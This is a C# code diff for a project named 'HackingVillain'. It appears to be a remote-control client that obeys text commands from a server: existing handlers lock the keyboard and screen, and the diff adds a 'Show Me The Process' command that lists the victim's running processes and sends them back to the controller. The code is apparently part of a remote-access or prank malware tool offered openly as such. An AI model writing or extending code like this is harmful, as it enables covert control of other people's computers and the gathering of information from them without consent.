@@ -2,7 +2,7 @@
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
-using System.Drawing;
+using System.Diagnostics;
 using System.Linq;
 using System.Text;
 using System.Threading;
@@ -45,13 +45,20 @@ namespace HackingVillain
             _hook.Dispose();
         }
 
+        public void Send(string msg)
+        {
+            Buffer b = Buffer.New();
+            Buffer.Add(b, Encoding.UTF8.GetBytes(msg));
+            _client.SendMessage(b);
+        }
+
         void Listen()
         {
             Buffer coming = Buffer.New();
             _client.ReceiveMessage(coming);
             Buffer.FinalizeBuffer(coming);
 
-            string data = Encoding.UTF32.GetString(Buffer.GetBuffer(coming));
+            string data = Encoding.UTF8.GetString(Buffer.GetBuffer(coming));
             data = data.TrimEnd('\0');
             if(data == "Lock Key")
             {
@@ -68,6 +75,12 @@ namespace HackingVillain
             else if(data == "UnLock Screen")
             {
                 _lock.Fuck();
+            }
+            else if(data == "Show Me The Process")
+            {
+                var processes = from p in Process.GetProcesses()
+                                select p.ProcessName;
+                Send(string.Join("\n", processes));
             }
         }
     }
